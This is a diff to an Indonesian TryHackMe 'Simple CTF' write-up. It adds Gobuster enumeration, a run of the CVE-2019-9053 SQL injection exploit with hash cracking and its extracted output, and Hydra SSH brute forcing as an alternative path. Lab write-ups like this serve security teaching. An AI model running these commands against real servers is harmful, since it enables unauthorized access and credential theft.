@@ -3,8 +3,8 @@
 - **Room Link:** [Simple CTF Challenge](https://tryhackme.com/room/simplectfchallenge)
 - **Category:** Challenge Room
 - **Difficulty:** Easy
-- **Tools Used:** Nmap, FTP client, Searchsploit, CVE-2019-9053 exploit (Python), Hydra, SSH, Vim
-- **Main Techniques:** Port scanning, anonymous FTP enumeration, exploit research, SQL injection (CMS Made Simple), SSH brute force, privilege escalation via sudo vim
+- **Tools Used:** Nmap, FTP client, Gobuster, Searchsploit, CVE-2019-9053 exploit (Python), Hydra, SSH, Vim
+- **Main Techniques:** Port scanning, anonymous FTP enumeration, directory brute force, exploit research, SQL injection (CMS Made Simple), SSH brute force, privilege escalation via sudo vim
 
 ---
 
@@ -91,9 +91,40 @@ Informasi berharga dari pesan ini:
 
 ### Web Application — CMS Made Simple
 
-Sekarang pindah ke port 80. Buka `http://MACHINE_IP` di browser, yang muncul hanyalah halaman default Apache ("It works"). Tapi ingat hasil Nmap tadi: `robots.txt` menyebutkan path `/openemr-5_0_1_3`. Coba akses path tersebut dan eksplorasi direktori web lainnya.
+Sekarang pindah ke port 80. Buka `http://MACHINE_IP` di browser — yang muncul hanyalah halaman default Apache ("It works"). Path `/openemr-5_0_1_3` dari `robots.txt` juga tidak memberikan hasil yang berguna. Untuk menemukan direktori tersembunyi, gunakan **Gobuster**:
 
-Setelah menelusuri, ternyata server ini menjalankan **CMS Made Simple** — sebuah _Content Management System_ berbasis PHP. Versi CMS biasanya terlihat di footer halaman login atau di source HTML. Ini informasi krusial, karena CMS Made Simple versi lama punya kerentanan SQL Injection yang sudah terdokumentasi publik.
+> **for your information:** **Gobuster** adalah tool directory/file brute force yang mengirim HTTP request ke path-path dari wordlist untuk menemukan halaman atau direktori yang tidak di-link dari halaman utama.
+
+```
+gobuster dir -u http://MACHINE_IP -w /home/dimm/SecLists/Discovery/Web-Content/common.txt
+```
+
+| Komponen | Fungsi |
+| :--- | :--- |
+| `gobuster` | Tool directory brute force |
+| `dir` | Mode directory enumeration |
+| `-u` | Target URL |
+| `-w` | Path ke wordlist |
+
+![Gobuster Directory Enumeration](Documentation-assets/Simple-CTF/Simple-enum.png)
+
+Gobuster menemukan beberapa path, tapi yang paling menarik:
+
+```
+/simple    (Status: 301) [Size: 315] [--> http://MACHINE_IP/simple/]
+```
+
+Akses `http://MACHINE_IP/simple/` di browser:
+
+![CMS Made Simple Homepage](Documentation-assets/Simple-CTF/CMS-Website-SimpleCTF.png)
+
+Ternyata ini adalah **CMS Made Simple** — sebuah _Content Management System_ berbasis PHP. Di halaman ini juga terlihat ada post dari user **mitch** (informasi ini mengonfirmasi username yang kita dapat dari `ForMitch.txt`).
+
+Scroll ke bagian paling bawah halaman untuk melihat footer:
+
+![CMS Version in Footer](Documentation-assets/Simple-CTF/CMS-Version.png)
+
+Footer menunjukkan: _"This site is powered by CMS Made Simple version **2.2.8**"_. Versi 2.2.8 berarti **lebih rendah dari 2.2.10** — ini rentan terhadap CVE-2019-9053.
 
 ---
 
@@ -101,11 +132,11 @@ Setelah menelusuri, ternyata server ini menjalankan **CMS Made Simple** — sebu
 
 ### Mencari Exploit yang Tepat
 
-Setelah tahu server menjalankan CMS Made Simple, langkah berikutnya adalah mencari apakah ada exploit publik yang tersedia. Ada dua cara yang dipakai:
+Setelah tahu CMS Made Simple versi 2.2.8 terpasang, langkah berikutnya adalah mencari exploit publik. Ada dua cara yang dipakai:
 
 **Cara 1: Google Search**
 
-Cari keyword seperti `cms made simple exploit` di Google untuk melihat CVE yang sudah dipublikasikan.
+Cari keyword seperti `cms made simple exploit` di Google.
 
 ![Google Search CVE](Documentation-assets/Simple-CTF/Search-CVE.png)
 
@@ -125,13 +156,11 @@ Output-nya menampilkan puluhan exploit untuk berbagai versi CMS Made Simple. Yan
 
 ### CVE-2019-9053: SQL Injection on CMS Made Simple
 
-Kerentanan **CVE-2019-9053** mempengaruhi CMS Made Simple versi di bawah 2.2.10. Exploit ini memungkinkan _Unauthenticated SQL Injection_ — artinya penyerang bisa mengekstrak data dari database **tanpa perlu login** ke aplikasi.
+Kerentanan **CVE-2019-9053** mempengaruhi CMS Made Simple versi di bawah 2.2.10. Exploit ini memungkinkan _Unauthenticated SQL Injection_ — penyerang bisa mengekstrak data dari database **tanpa perlu login** ke aplikasi.
 
 ![CVE-2019-9053 Exploit DB](Documentation-assets/Simple-CTF/CVE-2019-9053-SimpleCTF.png)
 
 > **for your information:** **SQL Injection** (_SQLi_) adalah kerentanan di mana input dari user diproses langsung sebagai bagian dari query database tanpa sanitasi yang benar. Penyerang bisa menyisipkan perintah SQL tambahan untuk membaca, mengubah, atau menghapus data di database.
-
-Detail exploit:
 
 | Item | Detail |
 | :--- | :--- |
@@ -141,22 +170,63 @@ Detail exploit:
 | **Platform** | PHP (Web Application) |
 | **Versi Rentan** | CMS Made Simple < 2.2.10 |
 
-Exploit Python ini (dari Exploit Database) bekerja dengan cara mengirim request berulang ke endpoint yang rentan, mengekstrak data karakter per karakter (_blind SQLi_ / _time-based SQLi_). Outputnya menghasilkan:
-- **Username** CMS
-- **Email**
-- **Password hash** (salt + hash)
+### Running the Exploit
 
-Password hash yang didapat kemudian di-_crack_ — dan sesuai petunjuk dari `ForMitch.txt`, password-nya memang sangat lemah sehingga bisa dipecahkan dalam hitungan detik.
+Jalankan script exploit `46635.py` dengan target path `/simple` (yang kamu temukan lewat Gobuster tadi):
+
+```
+python2 46635.py -u http://MACHINE_IP/simple --crack -w /home/dimm/SecLists/Passwords/Common-Credentials/10k-most-common.txt
+```
+
+| Komponen | Fungsi |
+| :--- | :--- |
+| `python2` | Menjalankan script dengan Python 2 (script ini ditulis untuk Python 2) |
+| `46635.py` | Script exploit SQLi dari Exploit Database |
+| `-u` | URL target CMS Made Simple (path `/simple`) |
+| `--crack` | Aktifkan mode cracking — otomatis crack hash setelah diekstrak |
+| `-w` | Wordlist untuk cracking password hash |
+
+![Running Exploit](Documentation-assets/Simple-CTF/Run-Exploit.png)
+
+Exploit ini bekerja dengan teknik _blind SQLi_ / _time-based SQLi_ — mengirim request berulang ke endpoint yang rentan dan mengekstrak data karakter per karakter. Prosesnya memakan waktu beberapa menit.
+
+> **Common Mistake:** Script ini ditulis untuk **Python 2**, bukan Python 3. Kalau dijalankan dengan `python3`, akan error karena perbedaan syntax (`print` statement, library `urllib`, dll). Pastikan pakai `python2`.
+
+### Exploit Output
+
+Setelah selesai, exploit menampilkan seluruh data yang berhasil diekstrak dari database:
+
+![Exploit Result](Documentation-assets/Simple-CTF/Exploit-Result.png)
+
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: [REDACTED]
+```
+
+| Output | Penjelasan |
+| :--- | :--- |
+| **Salt** | Nilai random yang ditambahkan ke password sebelum di-hash, untuk mencegah rainbow table attack |
+| **Username** | `mitch` — mengonfirmasi clue dari `ForMitch.txt` |
+| **Email** | `admin@admin.com` — email admin CMS |
+| **Password (hash)** | MD5 hash dari password + salt |
+| **Password cracked** | Hasil cracking — flag `--crack` otomatis mencocokkan hash dengan wordlist |
+
+Script ini menangani semuanya secara otomatis: ekstraksi data via SQLi **dan** cracking hash dalam satu langkah. Password yang ditemukan sangat lemah, sesuai petunjuk `ForMitch.txt`.
 
 ---
 
 ## Initial Access
 
-### Hydra: SSH Brute Force
+Dari clue `ForMitch.txt`, kamu sudah punya dua informasi penting: username kemungkinan **mitch** dan password-nya **sangat lemah**. Dengan informasi ini, ada dua pendekatan untuk mendapatkan credential SSH — keduanya valid dan menghasilkan password yang sama.
+
+### Approach 1: Hydra SSH Brute Force
+
+Pendekatan paling langsung: karena sudah tahu username dan password lemah, brute force SSH secara langsung.
 
 > **for your information:** **Hydra** adalah tool brute force yang mendukung berbagai protokol (SSH, FTP, HTTP, dll). Hydra mencoba login secara otomatis menggunakan kombinasi username dan password dari wordlist.
-
-Dari clue `ForMitch.txt`, kamu tahu password-nya lemah dan username kemungkinan `mitch`. Gunakan Hydra untuk brute force SSH di port 2222:
 
 ```
 sudo hydra -l mitch -P /home/dimm/Downloads/rockyou.txt ssh://MACHINE_IP -s 2222 -t 4
@@ -173,13 +243,19 @@ sudo hydra -l mitch -P /home/dimm/Downloads/rockyou.txt ssh://MACHINE_IP -s 2222
 
 ![Hydra Brute Force](Documentation-assets/Simple-CTF/hydra-BruteForce-blur.png)
 
-Hydra berhasil menemukan credential: **login: `mitch`** — **password: `[REDACTED]`**. Ini mengonfirmasi clue dari `ForMitch.txt` bahwa password-nya sangat lemah.
+Hydra berhasil menemukan credential: **login: `mitch`** — **password: `[REDACTED]`**. Pendekatan ini cepat dan langsung ke sasaran.
 
 > **Common Mistake:** Jangan lupa flag `-s` untuk menentukan port kustom. Tanpa `-s 2222`, Hydra akan mencoba SSH di port 22 (default) dan gagal koneksi.
 
+### Approach 2: SQLi Exploit (CVE-2019-9053)
+
+Pendekatan ini memberikan hasil yang lebih kaya. Selain password, exploit juga mengekstrak **username CMS**, **email**, **salt**, dan **password hash** dari database — informasi yang berguna untuk investigasi lebih dalam atau serangan lanjutan. Detail lengkap ada di section [Exploitation](#exploitation) di atas.
+
+Kedua pendekatan menghasilkan credential yang sama. Perbedaannya: Hydra hanya menemukan password, sedangkan SQLi exploit membongkar seluruh isi database CMS.
+
 ### SSH Login as Mitch
 
-Dengan credential yang sudah didapat, login via SSH:
+Dengan credential yang sudah didapat (dari pendekatan manapun), login via SSH:
 
 ```
 ssh -p 2222 mitch@MACHINE_IP
@@ -276,10 +352,19 @@ root@Machine:~# cat /root/root.txt
 graph LR
     A["Nmap Scan\n(Recon)"] --> B["FTP Anonymous\n(Enumeration)"]
     B --> C["ForMitch.txt\n(Clue)"]
-    C --> D["Searchsploit\n(Exploit Research)"]
-    D --> E["CVE-2019-9053\n(SQLi Exploit)"]
-    E --> F["Hydra\n(SSH Brute Force)"]
-    F --> G["SSH as Mitch\n(Initial Access)"]
+    C --> D["Gobuster\n(Dir Enum)"]
+    D --> E["CMS v2.2.8\n(Version ID)"]
+    E --> F["Searchsploit\n(Exploit Research)"]
+    F --> G["CVE-2019-9053\n(SQLi + Crack)"]
+```
+
+```mermaid
+graph TD
+    A["ForMitch.txt\n(username + weak pass)"] --> B["Approach 1:\nHydra SSH Brute Force"]
+    A --> C["Approach 2:\nSQLi Exploit"]
+    B --> D["Credential\n(mitch : *****)"]
+    C --> D
+    D --> E["SSH Login\n(Initial Access)"]
 ```
 
 ```mermaid
